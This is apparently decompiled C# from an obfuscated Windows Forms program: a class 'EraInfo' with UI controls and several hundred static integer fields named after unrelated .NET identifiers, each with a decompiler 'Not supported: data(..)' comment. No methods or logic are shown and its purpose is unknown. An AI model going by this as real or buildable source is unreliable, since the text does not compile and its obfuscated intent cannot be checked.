using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Timers;
using System.Windows.Forms;

public class EraInfo : Form
{
	private Timer get_IsAllocated;

	private int Reserved2;

	private int TryReadUInt16LittleEndian;

	private int Impersonation;

	private UnorderedNotEqualSignaling LeadingZeroCount;

	private IContainer DeserializationToken;

	private BackgroundWorker DefineLabel;

	private Label TryRunSingle;

	private TextBox get_DaylightDelta;

	private Label SetSize;

	private Label AllowHexSpecifier;

	private Panel IsTvOSVersionAtLeast;

	private Panel panel_0;

	private Label R_OK;

	private Button M21;

	private Label AmbiguousMatchException;

	private TextBox OverwriteExisting;

	private Label get_CanRead;

	private Button Next;

	private TextBox set_PercentPositivePattern;

	private TextBox Ldloc;

	private Label get_Modules;

	private Label ToVector128Unsafe;

	private TextBox HString;

	private Panel MarvinSeed;

	private Label CompressedStack;

	private static int SAKA/* Not supported: data(00 00 00 00) */;

	private static int HasFlagsAttribute/* Not supported: data(01 00 00 00) */;

	private static int PreserveBaseOverridesAttribute/* Not supported: data(03 00 00 00) */;

	private static int ActualValue/* Not supported: data(02 00 00 00) */;

	private static int ConfiguredTaskAwaitable__1/* Not supported: data(04 00 00 00) */;

	private static int CompareScalarUnorderedNotEqual/* Not supported: data(3B 00 00 00) */;

	private static int TSpan/* Not supported: data(05 00 00 00) */;

	private static int get_IsHideBySig/* Not supported: data(64 21 00 00) */;

	private static int EventLevel/* Not supported: data(40 00 00 00) */;

	private static int get_SourceInterface/* Not supported: data(64 65 00 00) */;

	private static int ShortInlineR/* Not supported: data(0F 00 00 00) */;

	private static int UseDllDirectoryForDependencies/* Not supported: data(04 16 00 00) */;

	private static int set_Url/* Not supported: data(C3 01 00 00) */;

	private static int add_AssemblyResolve/* Not supported: data(BC 01 00 00) */;

	private static int FormatException/* Not supported: data(60 0E 00 00) */;

	private static int MemoryPressure/* Not supported: data(E5 47 00 00) */;

	private static int BinaryReader/* Not supported: data(C6 01 00 00) */;

	private static int Binary/* Not supported: data(A7 0F 00 00) */;

	private static int S400_400_100/* Not supported: data(82 10 00 00) */;

	private static int SecurityCriticalAttribute/* Not supported: data(2F 00 00 00) */;

	private static int Num/* Not supported: data(C0 2A 00 00) */;

	private static int Subtract/* Not supported: data(08 00 00 00) */;

	private static int get_CurrentUICulture/* Not supported: data(FE FF FF FF) */;

	private static int EDQUOT/* Not supported: data(10 00 00 00) */;

	private static int Sse42/* Not supported: data(0C 00 00 00) */;

	private static int HebrewNumberParsingContext/* Not supported: data(FF FF FF FF) */;

	private static int add_ResourceResolve/* Not supported: data(A5 34 F8 FF) */;

	private static int CannotUnloadAppDomainException/* Not supported: data(83 D4 00 00) */;

	private static int function/* Not supported: data(EC 0C 00 00) */;

	private static int Popref_popi_popr4/* Not supported: data(CC E4 08 00) */;

	private static int get_GenericTypeParameters/* Not supported: data(0B 00 00 00) */;

	private static int Range/* Not supported: data(73 00 00 00) */;

	private static int WhenAllPromise__1/* Not supported: data(A4 A4 04 00) */;

	private static int EAFNOSUPPORT/* Not supported: data(48 80 FC FF) */;

	private static int POSIX_FADV_RANDOM/* Not supported: data(A8 28 00 00) */;

	private static int op_Explicit/* Not supported: data(F5 0F 01 00) */;

	private static int EOPNOTSUPP/* Not supported: data(33 58 05 00) */;

	private static int get_ShortTimePattern/* Not supported: data(CA BC FE FF) */;

	private static int ct/* Not supported: data(96 F6 FE FF) */;

	private static int ConcurrentCollection_SyncRoot_NotSupported/* Not supported: data(B8 87 F2 FF) */;

	private static int TasksSetActivityIds/* Not supported: data(C4 C7 F0 FF) */;

	private static int AssemblyBuilderAccess/* Not supported: data(9D C8 CC 5C) */;

	private static int get_ActivityId/* Not supported: data(67 2B 01 00) */;

	private static int F_WRLCK/* Not supported: data(B4 4F 01 00) */;

	private static int TaskNode/* Not supported: data(2C FC 07 00) */;

	private static int LengthSquared/* Not supported: data(DB FD FF FF) */;

	private static int D_NN/* Not supported: data(B5 11 0B 00) */;

	private static int Byte14/* Not supported: data(7D F7 00 00) */;

	private static int KeepAlive/* Not supported: data(E5 DB 00 00) */;

	private static int HasBirthTime/* Not supported: data(D5 6D 0B 00) */;

	private static int CommonDocuments/* Not supported: data(F0 DF 04 00) */;

	private static int DefineInitializedData/* Not supported: data(44 49 0B 00) */;

	private static int TwoDigitYearMax/* Not supported: data(5B 01 00 00) */;

	private static int ICustomAttributeProvider/* Not supported: data(0B 01 00 00) */;

	private static int TryFromBase64String/* Not supported: data(87 C3 01 00) */;

	private static int MovePrevious/* Not supported: data(48 00 00 00) */;

	private static int TraceOperationBegin/* Not supported: data(EA C2 00 00) */;

	private static int StructureToPtr/* Not supported: data(F9 04 00 00) */;

	private static int ReciprocalScalar/* Not supported: data(2F FD FF FF) */;

	private static int get_VersionCompatibility/* Not supported: data(0A 8B 0D 00) */;

	private static int ReadTimeout/* Not supported: data(77 7C 02 00) */;

	private static int op_LessThan/* Not supported: data(1B 00 00 00) */;

	private static int DynamicallyAccessedMembersAttribute/* Not supported: data(2A 00 00 00) */;

	private static int Stream/* Not supported: data(02 00 00 00) */;

	private static int get_PositiveInfinity/* Not supported: data(00 00 00 00) */;

	private static int get_CurrencyGroupSeparator/* Not supported: data(01 00 00 00) */;

	private static int endAction/* Not supported: data(03 00 00 00) */;

	private static int get_ResourceExposureLevel/* Not supported: data(04 00 00 00) */;

	private static int FlattenHierarchy/* Not supported: data(05 00 00 00) */;

	private static int GetDllEntry/* Not supported: data(FF FF FF FF) */;

	private static int CreateGlobalFunctions/* Not supported: data(07 00 00 00) */;

	private static int PrivateScope/* Not supported: data(0F 00 00 00) */;

	private static int Never/* Not supported: data(0C 00 00 00) */;

	private static int HexIntPtrType/* Not supported: data(FE FF FF FF) */;

	private static int HashUpdate2/* Not supported: data(E9 1B 00 00) */;

	private static int WaitHandleExtensions/* Not supported: data(23 DF 02 00) */;

	private static int CreateComInterfaceFlags/* Not supported: data(0E 35 FF FF) */;

	private static int GenericMethodInfo/* Not supported: data(15 00 00 00) */;

	private static int TX_TS/* Not supported: data(82 50 00 00) */;

	private static int OnStart/* Not supported: data(A5 D6 F7 FF) */;

	private static int IsGmtCount/* Not supported: data(97 41 00 00) */;

	private static int CompareGreaterThan/* Not supported: data(7B E9 FF FF) */;

	private static int MultiplyRoundedDoublingBySelectedScalarAndSubtractSaturateHigh/* Not supported: data(6F 05 00 00) */;

	private static int tasks/* Not supported: data(44 98 04 00) */;

	private static int InsertAt/* Not supported: data(68 BC 04 00) */;

	private static int __9__40_0/* Not supported: data(2B 00 00 00) */;

	private static int CancellationTokenRegistration/* Not supported: data(EA 3B FD FF) */;

	private static int AssemblyFlags/* Not supported: data(6C 1F 00 00) */;

	private static int TypeKind/* Not supported: data(2E 0F 00 00) */;

	private static int EnumComparer__1/* Not supported: data(BF 0B 00 00) */;

	private static int ExceptionFallback/* Not supported: data(7F E3 FF FF) */;

	private static int ContainsValue/* Not supported: data(4C A0 19 B1) */;

	private static int FixedRotate/* Not supported: data(62 C8 FF FF) */;

	private static int WriteAsync/* Not supported: data(8F 0A 00 00) */;

	private static int SumAbsoluteDifferences/* Not supported: data(02 8F FF FF) */;

	private static int __9__25_16/* Not supported: data(F7 0B 00 00) */;

	private static int RemoveRange/* Not supported: data(A0 D0 00 00) */;

	private static int CorrelationHint/* Not supported: data(7F 04 00 00) */;

	private static int BeginExceptionBlock/* Not supported: data(A3 98 F7 FF) */;

	private static int CoClass/* Not supported: data(D6 0F 00 00) */;

	private static int GetRaiseMethod/* Not supported: data(DF 01 00 00) */;

	private static int ReadOnlyMemory__1/* Not supported: data(F2 02 00 00) */;

	private static int Beq/* Not supported: data(9E 8B 00 00) */;

	private static int Mode/* Not supported: data(09 08 02 00) */;

	private static int IsNestedFamANDAssem/* Not supported: data(25 AB F6 FF) */;

	private static int CC_STDCALL/* Not supported: data(AA 01 00 00) */;

	private static int Hour/* Not supported: data(13 41 00 00) */;

	private static int get_Day/* Not supported: data(76 FA 6F 18) */;

	private static int IsClosed/* Not supported: data(8E 31 70 BF) */;

	private static int remove_DomainUnload/* Not supported: data(FC 4D 00 00) */;

	private static int __9__60_1/* Not supported: data(10 85 F7 FF) */;

	private static int TotalMilliseconds/* Not supported: data(25 03 00 00) */;

	private static int DefineSequencePoints/* Not supported: data(46 05 00 00) */;

	private static int VT_R8/* Not supported: data(77 A7 FB FF) */;

	private static int LoadAlignedVector256/* Not supported: data(5D 8A 04 00) */;

	private static int set_NumberDecimalSeparator/* Not supported: data(C8 01 00 00) */;

	private static int get_Capacity/* Not supported: data(ED 55 00 00) */;

	private static int NoneViaConstructor/* Not supported: data(25 02 00 00) */;

	private static int UnauthenticatedPrincipal/* Not supported: data(5C 05 00 00) */;

	private static int AddRef/* Not supported: data(B9 38 00 00) */;

	private static int PersistedFiles/* Not supported: data(52 60 53 55) */;

	private static int get_TotalAvailableMemoryBytes/* Not supported: data(98 83 00 00) */;

	private static int IsNotSerialized/* Not supported: data(4F FC FE FF) */;

	private static int RunSynchronously/* Not supported: data(75 04 00 00) */;

	private static int ParseNumbers/* Not supported: data(23 DD F3 FF) */;

	private static int ThreadInterrupted/* Not supported: data(09 C1 F1 FF) */;

	private static int get_Count/* Not supported: data(1B 55 00 00) */;

	private static int get_UserMessage/* Not supported: data(DD 03 00 00) */;

	private static int DebuggerBrowsableState/* Not supported: data(E4 EA 00 00) */;

	private static int get_Instance/* Not supported: data(74 0C 00 00) */;

	private static int TotalMinutes/* Not supported: data(A9 6F 00 00) */;

	private static int NotApplicable/* Not supported: data(33 B5 00 00) */;

	private static int TickCount/* Not supported: data(01 DC 09 00) */;

	private static int T2/* Not supported: data(19 1F 06 00) */;

	private static int EBCDICCodePage/* Not supported: data(A6 F9 F8 FF) */;

	private static int Sometimes/* Not supported: data(55 16 00 00) */;

	private static int Free/* Not supported: data(35 33 01 00) */;

	private static int lpvarValue/* Not supported: data(1F 1F 00 00) */;

	private static int SerializationInfo/* Not supported: data(49 A7 0C 00) */;

	private static int continuationAction/* Not supported: data(C0 D4 FE FF) */;

	private static int LessThanOrEqualAny/* Not supported: data(21 2E 0B 00) */;

	private static int get_ScheduledConcurrent/* Not supported: data(4C FD 0C 00) */;

	private static int FallbackBuffer/* Not supported: data(05 F4 FF FF) */;

	private static int StringToInt/* Not supported: data(5B 07 00 00) */;

	private static int add_EventCommandExecuted/* Not supported: data(12 E9 E1 FF) */;

	private static int Narrow/* Not supported: data(61 01 00 00) */;

	private static int get_RuleSet/* Not supported: data(D5 C7 02 00) */;

	private static int OrdinalComparer/* Not supported: data(CD 25 0D 00) */;

	private static int Constrained_/* Not supported: data(D6 44 07 00) */;

	private static int SecureStringToGlobalAllocAnsi/* Not supported: data(98 44 00 00) */;

	private static int Pow10/* Not supported: data(03 14 01 00) */;

	private static int get_MethodImplementationFlags/* Not supported: data(B3 AC 01 00) */;

	private static int CustomAttributeData/* Not supported: data(F1 1B 00 00) */;

	private static int SystemTime/* Not supported: data(BC BC 0B 00) */;

	private static int FusedMultiplyAddScalar/* Not supported: data(11 83 0C 00) */;

	private static int DefaultMemberAttribute/* Not supported: data(C1 63 04 00) */;

	private static int TryReadInt16LittleEndian/* Not supported: data(3D 35 00 00) */;

	private static int ConvertToUInt64RoundToZeroScalar/* Not supported: data(3C 00 00 00) */;

	private static int AllocateUninitializedArray/* Not supported: data(C9 3A 00 00) */;

	private static int getter/* Not supported: data(74 07 00 00) */;

	private static int SecurityElement/* Not supported: data(29 42 FF FF) */;

	private static int MemberName/* Not supported: data(CB 49 00 00) */;

	private static int TX_NN/* Not supported: data(E2 E9 F6 FF) */;

	private static int HandleProcessCorruptedStateExceptionsAttribute/* Not supported: data(21 0F 00 00) */;

	private static int IAsyncStateMachineBox/* Not supported: data(66 38 00 00) */;

	private static int ModuleInitializerAttribute/* Not supported: data(06 F2 0C 00) */;

	private static int Void/* Not supported: data(8A C3 0A 00) */;

	private static int CommonPrograms/* Not supported: data(9C 08 00 00) */;

	private static int DOpenNamespace/* Not supported: data(9C 00 00 00) */;

	private static int ConvertToUInt32/* Not supported: data(40 ED CC 14) */;

	private static int AttachedToParent/* Not supported: data(2C E8 FF FF) */;

	private static int IsName/* Not supported: data(A4 D0 07 00) */;

	private static int Latin1Utility/* Not supported: data(89 83 00 00) */;

	private static int GetUnderlyingObject/* Not supported: data(FC 90 07 00) */;

	private static int FixedSize/* Not supported: data(37 7D 00 00) */;

	private static int CheckAccessOnOverride/* Not supported: data(D6 16 00 00) */;

	private static int ICollectionDebugView__1/* Not supported: data(77 2E F1 FF) */;

	private static int ContainsKey/* Not supported: data(76 17 00 00) */;

	private static int IsTypeDef/* Not supported: data(A3 D6 F2 FF) */;

	private static int IEnumVARIANT/* Not supported: data(44 94 00 00) */;

	private static int OrderedNonSignaling/* Not supported: data(58 0E 00 00) */;

	private static int TStateMachine/* Not supported: data(C0 5B 76 22) */;

	private static int System_002EBuffers_002EBinary/* Not supported: data(D7 31 F2 FF) */;

	private static int GCHeapDumpKeyword/* Not supported: data(10 00 00 00) */;

	private static int dwCookie/* Not supported: data(08 00 00 00) */;

	private static int MdFieldInfo/* Not supported: data(06 00 00 00) */;

	private static int O_WRONLY/* Not supported: data(FB FF FF FF) */;

	private static int BSTRMarshaler/* Not supported: data(FD FF FF FF) */;

	private static int get_IsJITTrackingEnabled/* Not supported: data(14 00 00 00) */;

	private static int get_CurrentReadCount/* Not supported: data(0E 00 00 00) */;

	private static int GetUtf8SequenceLength/* Not supported: data(13 00 00 00) */;

	private static int remove_EventCommandExecuted/* Not supported: data(C7 00 00 00) */;

	private static int AsyncCausalitySynchronousWork/* Not supported: data(28 00 00 00) */;

	private static int get_IsMemberRef/* Not supported: data(0A 00 00 00) */;

	private static int CompatibilitySwitch/* Not supported: data(09 00 00 00) */;

	private static int IsPrefix/* Not supported: data(FC FF FF FF) */;

	private static int StoreSelectedScalar/* Not supported: data(DF FF FF FF) */;

	private static int get_CurrentThread/* Not supported: data(12 00 00 00) */;

	private static int NullRef/* Not supported: data(0D 00 00 00) */;

	private static int ConstructionException/* Not supported: data(6D 00 00 00) */;

	private static int NumberGroupSizes/* Not supported: data(0B 00 00 00) */;

	private static int GetRemainingCount/* Not supported: data(D3 01 00 00) */;

	private static int Popref_popi_popr8/* Not supported: data(17 00 00 00) */;

	private static int set_AbbreviatedMonthNames/* Not supported: data(38 7D FE FF) */;

	private static int int_0/* Not supported: data(3B 25 F9 FF) */;

	private static int Rank/* Not supported: data(E0 9F 0A 00) */;

	private static int get_TimeSeparator/* Not supported: data(03 07 00 00) */;

	private static int FilterNameIgnoreCase/* Not supported: data(7D 00 07 00) */;

	private static int InitLocals/* Not supported: data(EC 45 00 00) */;

	private static int MethodHandle/* Not supported: data(76 28 00 00) */;

	private static int HtmlEntities/* Not supported: data(03 59 0A 00) */;

	private static int get_SystemPageSize/* Not supported: data(FA FB FA FF) */;

	private static int SecurityTransparentAttribute/* Not supported: data(B3 60 07 00) */;

	private static int ELEMENT_TYPE_U2/* Not supported: data(91 33 00 00) */;

	private static int get_UtcTicks/* Not supported: data(55 5E FA FF) */;

	private static int StdCall/* Not supported: data(50 6D 03 00) */;

	private static int CC_PASCAL/* Not supported: data(D1 5C F4 FF) */;

	private static int Int32ToDecStr/* Not supported: data(31 17 04 00) */;

	private static int get_TimeStamp/* Not supported: data(A1 0A 00 00) */;

	private static int EnumName/* Not supported: data(77 57 06 00) */;

	private static int get_Max/* Not supported: data(1C E9 FD FF) */;

	private static int IMPLTYPEFLAGS/* Not supported: data(76 7F 07 00) */;

	private static int __c__DisplayClass0_16/* Not supported: data(77 89 0D 00) */;

	private static int CovariantReturnsOfClasses/* Not supported: data(B4 C5 07 00) */;

	private static int MaxNumberAcross/* Not supported: data(1A 00 00 00) */;

	private static int GetModules/* Not supported: data(2A 2F 01 00) */;

	private static int NullTextWriter/* Not supported: data(7A E1 F4 FF) */;

	private static int TaskAwaiter/* Not supported: data(D8 4D 00 00) */;

	private static int get_DeclaredNestedTypes/* Not supported: data(04 91 FF FF) */;

	private static int MarkSequencePoint/* Not supported: data(6F 66 00 00) */;

	private static int AsRef/* Not supported: data(8F 4E FF FF) */;

	private static int ShortTimePattern/* Not supported: data(AD 3B 00 00) */;

	private static int PureAttribute/* Not supported: data(87 10 00 00) */;

	private static int TicksPerHour/* Not supported: data(97 CF F8 FF) */;

	private static int get_TickCount64/* Not supported: data(7C 8F FF FF) */;

	private static int BitwiseOr/* Not supported: data(0D 91 F4 FF) */;

	private static int lengths/* Not supported: data(3A B1 F5 FF) */;

	private static int UpdateTimeOut/* Not supported: data(33 00 00 00) */;

	private static int AsPointer/* Not supported: data(F6 FF FF FF) */;

	private static int __9__4_0/* Not supported: data(65 66 FF FF) */;

	private static int ReciprocalEstimate/* Not supported: data(32 00 00 00) */;

	private static int GetIndexOfFirstNonAsciiChar/* Not supported: data(FE F9 00 00) */;

	private static int ComputeHash32/* Not supported: data(F6 75 04 00) */;

	private static int GregorianCalendar/* Not supported: data(D2 D4 E0 F5) */;

	private static int TrailingZeroCount/* Not supported: data(76 23 FC FF) */;

	private static int __9__40_1/* Not supported: data(07 32 09 00) */;

	private static int Midday/* Not supported: data(D5 93 F6 FF) */;

	private static int Stop/* Not supported: data(21 0A 0E 00) */;

	private static int get_WrapNonExceptionThrows/* Not supported: data(5D 83 FC FF) */;

	private static int GetTypeInfoCount/* Not supported: data(2D 00 00 00) */;

	private static int Event/* Not supported: data(64 67 F1 FF) */;

	private static int RuntimeLocalVariableInfo/* Not supported: data(35 CE FE FF) */;

	private static int U0/* Not supported: data(D6 66 00 00) */;

	private static int MultiplyDoublingWideningScalarBySelectedScalarAndSubtractSaturate/* Not supported: data(85 54 77 AF) */;

	private static int HashCode/* Not supported: data(16 04 00 00) */;

	private static int LazyState/* Not supported: data(AF 11 00 00) */;

	private static int AddDays/* Not supported: data(65 F2 05 00) */;

	private static int ValueTuple__8/* Not supported: data(D4 00 00 00) */;

	private static int MethodToken/* Not supported: data(C6 C9 0B 00) */;

	private static int CountDigits/* Not supported: data(A3 1E 00 00) */;

	private static int System_002EDiagnostics/* Not supported: data(02 2F 00 00) */;

	private static int ChineseLunisolarCalendar/* Not supported: data(D6 9D 05 00) */;

	private static int System_002EResources/* Not supported: data(DD FD FE FF) */;

	private static int EventWaitHandle/* Not supported: data(68 39 FA FF) */;

	private static int SetDynamicBase/* Not supported: data(2E 58 06 00) */;

	private static int set_AMDesignator/* Not supported: data(20 00 00 00) */;

	private static int AllocateSlot/* Not supported: data(D5 EB FE FF) */;

	private static int get_Precision/* Not supported: data(58 BA FE FF) */;

	private static int set_PercentGroupSeparator/* Not supported: data(41 00 00 00) */;

	private static int MemberTypes/* Not supported: data(D3 E4 00 00) */;

	private static int LineNumberInfo/* Not supported: data(66 D7 F7 FF) */;

	private static int EventIgnoreAttribute/* Not supported: data(85 A8 FF FF) */;

	private static int Lerp/* Not supported: data(21 DB 05 00) */;

	private static int TYPEFLAG_FDISPATCHABLE/* Not supported: data(3D 03 00 00) */;

	private static int MarkLabel/* Not supported: data(3B 2E FF FF) */;

	private static int Tristate/* Not supported: data(FE FD FF FF) */;

	private static int BigMul/* Not supported: data(E4 B8 F7 FF) */;

	private static int ReadAllBytes/* Not supported: data(17 8D FF FF) */;

	private static int set_Type/* Not supported: data(A7 6C 09 00) */;

	private static int DivRem/* Not supported: data(7F 38 00 00) */;

	private static int PadLeft/* Not supported: data(EC D3 FF FF) */;

	private static int Task_Start_Promise/* Not supported: data(5E FA 0F 00) */;

	private static int get_IsNestedPublic/* Not supported: data(1A C1 F8 FF) */;

	private static int ReadUInt64LittleEndian/* Not supported: data(24 9C FE FF) */;

	private static int WaiterStates/* Not supported: data(C8 B6 0E 00) */;

	private static int get_BytesUnknown/* Not supported: data(78 26 FB FF) */;

	private static int TraceLoggingEventTypes/* Not supported: data(D9 2F 01 00) */;

	private static int PARAMFLAG_FHASDEFAULT/* Not supported: data(39 9F 02 00) */;

	private static int HelpLink/* Not supported: data(F3 FF 0A 00) */;

	private static int ReadUInt32BigEndian/* Not supported: data(DE EE F6 FF) */;

	private static int TargetedPatchBand/* Not supported: data(BC 21 00 00) */;

	private static int get_EncodedEnumType/* Not supported: data(FC 67 F9 FF) */;

	private static int Id/* Not supported: data(19 84 01 00) */;

	private static int UserDomainName/* Not supported: data(31 00 00 00) */;

	private static int Format8/* Not supported: data(FF 03 00 00) */;

	private static int remove_UnhandledException/* Not supported: data(27 05 00 00) */;

	private static int ShiftRightLogicalNarrowingSaturateLower/* Not supported: data(C0 E5 00 00) */;

	private static int Overlaps/* Not supported: data(31 38 F9 FF) */;

	private static int GetTypeArray/* Not supported: data(08 A5 D0 59) */;

	private static int IsFullTypeNameSetExplicit/* Not supported: data(35 4A 01 00) */;

	private static int SignExtendWideningLower/* Not supported: data(5F 5E 0D 00) */;

	private static int get_InvariantCultureIgnoreCase/* Not supported: data(BE 65 F9 FF) */;

	private static int Arg_ArrayPlusOffTooSmall/* Not supported: data(D0 FE F9 FF) */;

	private static int Passwd/* Not supported: data(CE 76 F9 FF) */;

	private static int FamANDAssem/* Not supported: data(0D 27 F8 FF) */;

	private static int GetPropertyGetter/* Not supported: data(88 91 F1 FF) */;

	private static int ParserHelpers/* Not supported: data(5B 76 0C 00) */;

	private static int UInt64/* Not supported: data(49 03 04 00) */;

	private static int Vector__1/* Not supported: data(DC 83 01 00) */;

	private static int TimeZoneInfoResult/* Not supported: data(3C F2 FE FF) */;

	private static int GetObjectsForNativeVariants/* Not supported: data(93 6B 00 00) */;

	private static int IReadOnlySet__1/* Not supported: data(9B 75 F1 FF) */;

	private static int MultiplyDoublingWideningSaturateLowerBySelectedScalar/* Not supported: data(DA 14 00 00) */;

	private static int VolatileObject/* Not supported: data(BD DF 00 00) */;

	private static int TransposeEven/* Not supported: data(62 9C FF FF) */;

	private static int get_IsMailNewsSave/* Not supported: data(C3 F0 F0 FF) */;

	private static int FromException/* Not supported: data(23 D9 0C 00) */;

	private static int get_PerMilleSymbol/* Not supported: data(0E 27 F3 FF) */;

	private static int CharUnicodeInfo/* Not supported: data(F7 07 00 00) */;

	private static int SEP_DateOrOffset/* Not supported: data(4B F1 FE FF) */;

	private static int KeyValuePair/* Not supported: data(1E FF FE FF) */;

	private static int BindToObject/* Not supported: data(EB 01 00 00) */;

	private static int IsEnabled/* Not supported: data(7A 4A FF FF) */;

	private static int EnumEqualityComparer__1/* Not supported: data(10 52 42 08) */;

	private static int get_Command/* Not supported: data(CA 6A 00 00) */;

	private static int get_ArgumentCount/* Not supported: data(9C 6B 09 00) */;

	private static int Now/* Not supported: data(F1 12 00 00) */;

	private static int val/* Not supported: data(E8 68 08 00) */;

	private static int EnsureInitialized/* Not supported: data(B1 DE 07 00) */;

	private static int DynamicInterfaceCastableImplementationAttribute/* Not supported: data(AB DE 07 00) */;

	private static int AsVectorUInt32/* Not supported: data(EF 56 0C 00) */;

	private static int InstanceMethodOnly/* Not supported: data(80 02 00 00) */;

	private static int ContinueWithTaskContinuation/* Not supported: data(2D EB FF FF) */;

	private static int BinderState/* Not supported: data(F4 12 00 00) */;

	private static int EBADF/* Not supported: data(B3 66 3D 02) */;

	private static int EventInfo/* Not supported: data(D6 7F F3 FF) */;

	private static int StrongBox__1/* Not supported: data(73 DE 0C 00) */;

	private static int invkind/* Not supported: data(E3 FF FF FF) */;

	private static int get_IntervalSec/* Not supported: data(77 1F 05 00) */;

	private static int OperatingSystem/* Not supported: data(77 FE FF FF) */;

	private static int CollectionCount/* Not supported: data(DC F1 FB FF) */;

	private static int get_LocalizationResources/* Not supported: data(65 FB 06 00) */;

	private static int get_LoaderExceptions/* Not supported: data(2A 15 F4 FF) */;

	private static int StateMachineType/* Not supported: data(5D 40 FF FF) */;

	private static int Json/* Not supported: data(49 B3 03 00) */;

	private static int get_Current/* Not supported: data(27 24 0E 00) */;

	private static int SEP_LocalTimeMark/* Not supported: data(F5 02 00 00) */;

	private static int get_DaylightTransitionStart/* Not supported: data(58 38 00 00) */;

	private static int OpCode/* Not supported: data(D3 2C FE FF) */;

	private static int Reason/* Not supported: data(7E 4C F5 FF) */;

	private static int TryFormatUInt64/* Not supported: data(50 EF 08 00) */;

	private static int GetLogicalDrives/* Not supported: data(E2 A6 FF FF) */;

	private static int DateStart/* Not supported: data(0E 42 00 00) */;

	private static int DefaultValueAttribute/* Not supported: data(27 84 0D 00) */;

	private static int ResolveMethod/* Not supported: data(A5 6D 92 00) */;

	private static int int_1/* Not supported: data(62 CF 02 00) */;

	private static int set_Metadata/* Not supported: data(70 3A 0E 00) */;

	private static int DeserializationTracker/* Not supported: data(77 5A 00 00) */;

	private static int GetConstructorToken/* Not supported: data(57 00 00 00) */;

	private static int BindType/* Not supported: data(BB 53 0C 00) */;

	private static int AsInt64/* Not supported: data(42 5E F9 FF) */;

	private static int IntroducedMethodEnumerator/* Not supported: data(7C FA 0B 00) */;

	private static int get_IsParamDef/* Not supported: data(C2 50 04 00) */;

	private static int GetLower/* Not supported: data(32 CF FE FF) */;

	private static int GetCustomAttributes/* Not supported: data(42 9C 02 00) */;

	private static int get_FriendlyName/* Not supported: data(CA 01 FF FF) */;

	private static int HebrewValue/* Not supported: data(EE 24 06 00) */;

	private static int get_DeclaredConstructors/* Not supported: data(83 0C 00 00) */;

	private static int LessThan/* Not supported: data(BD 1C F1 AD) */;

	private static int SignatureByRefType/* Not supported: data(28 F4 0C 00) */;

	private static int Version/* Not supported: data(33 BB 00 00) */;

	private static int GetInt32/* Not supported: data(FD 4D 0C 00) */;

	private static int IsInterface/* Not supported: data(FD 00 00 00) */;

	private static int CreateManifest/* Not supported: data(C8 8C FC FF) */;

	private static int WaitForFullGCApproach/* Not supported: data(F0 4F 0E 00) */;

	private static int NegativeMonetaryNumberFormat/* Not supported: data(73 EA 05 00) */;

	private static int get_Target/* Not supported: data(01 1A F6 FF) */;

	private static int MethodSemanticsAttributes/* Not supported: data(BF 5D 09 00) */;

	private static int PulseAll/* Not supported: data(91 3E FF FF) */;

	private static int IsReadOnlyAttribute/* Not supported: data(11 6A 02 00) */;

	private static int WaitingForActivation/* Not supported: data(57 51 F6 FF) */;

	private static int AltDirectorySeparatorChar/* Not supported: data(D5 DC 05 00) */;

	private static int ProcessingMode/* Not supported: data(81 78 F5 FF) */;

	private static int UseSpacesInMonthNames/* Not supported: data(A3 95 F0 FF) */;

	private static int get_IsImport/* Not supported: data(9C BF 0A 00) */;

	private static int ToUpperInvariantMode/* Not supported: data(FB 46 F3 FF) */;

	private static int MethodImplAttributes/* Not supported: data(0B BE F8 FF) */;

	private static int TargetPlatformAttribute/* Not supported: data(F6 B0 D4 38) */;

	private static int op_UnaryNegation/* Not supported: data(3B 45 FA FF) */;

	private static int IsHeld/* Not supported: data(30 00 00 00) */;

	private static int ActivityTracker/* Not supported: data(EF DD FA FF) */;

	private static int TimeZoneToken/* Not supported: data(20 22 05 00) */;

	private static int AddMonths/* Not supported: data(3C C9 FE FF) */;

	private static int flushEncoder/* Not supported: data(3A 00 00 00) */;

	private static int Signature/* Not supported: data(6F 28 00 00) */;

	private static int RequiresStringComparison/* Not supported: data(43 AB 03 00) */;

	private static int Title/* Not supported: data(2F D0 F5 FF) */;

	private static int ResourceEnumerator/* Not supported: data(9A CB 0C 00) */;

	private static int IsFreeBSD/* Not supported: data(CE 3F 00 00) */;

	private static int GetSetMethod/* Not supported: data(84 08 FE FF) */;

	private static int __9__64_0/* Not supported: data(48 FA F3 FF) */;

	private static int get_RecursiveWriteCount/* Not supported: data(32 75 FF FF) */;

	private static int Unbox_Any/* Not supported: data(CF 90 03 00) */;

	private static int UMALQURA/* Not supported: data(7B 2D 07 00) */;

	private static int AddHighNarrowingUpper/* Not supported: data(2D DC 00 00) */;

	private static int __9__140_0/* Not supported: data(4E 52 45 47) */;

	private static int ConfiguredValueTaskAwaitable__1/* Not supported: data(88 2D 00 00) */;

	private static int SetCustomAttribute/* Not supported: data(7B 97 FB FF) */;

	private static int GetPrimaryAndSecondary/* Not supported: data(94 F3 92 72) */;

	private static int Char/* Not supported: data(DF B2 09 00) */;

	private static int TypeCode/* Not supported: data(70 2C F8 FF) */;

	private static int cbSizeInstance/* Not supported: data(AD D3 FF FF) */;

	private static int AssemblyDefaultAliasAttribute/* Not supported: data(CB E6 FE FF) */;

	private static int EnvironmentVariableTarget/* Not supported: data(53 1D 00 00) */;

	private static int MngdNativeArrayMarshaler/* Not supported: data(89 CA F2 FF) */;

	private static int int_2/* Not supported: data(63 3F 0D 00) */;

	private static int list/* Not supported: data(14 B1 07 00) */;

	private static int TranscodeToUtf16/* Not supported: data(1E 90 F5 FF) */;

	private static int Out/* Not supported: data(63 10 F1 FF) */;

	private static int TryFormatUInt32/* Not supported: data(4C BB 05 00) */;

	private static int DefineLiteral/* Not supported: data(90 86 04 00) */;

	private static int IMemoryOwner__1/* Not supported: data(78 77 09 00) */;

	private static int match/* Not supported: data(E3 00 00 00) */;

	private static int MethodTable/* Not supported: data(D6 8C 39 68) */;

	private static int Overlapped/* Not supported: data(20 35 FF FF) */;

	private static int Explicit/* Not supported: data(84 78 23 34) */;

	private static int Permute2x128/* Not supported: data(D5 CD 0D 00) */;

	private static int IsGenericMethod/* Not supported: data(DF 1F 00 00) */;

	private static int EventPipeSerializationFormat/* Not supported: data(5B CC FF 3F) */;

	private static int CC_MAX/* Not supported: data(00 CC FF FF) */;

	private static int AssemblyPath/* Not supported: data(58 1B FD FF) */;

	private static int MoveNext/* Not supported: data(73 81 13 1A) */;

	private static int GetMemberRefProps/* Not supported: data(16 5B 00 00) */;

	private static int Members/* Not supported: data(2B 1D 08 00) */;

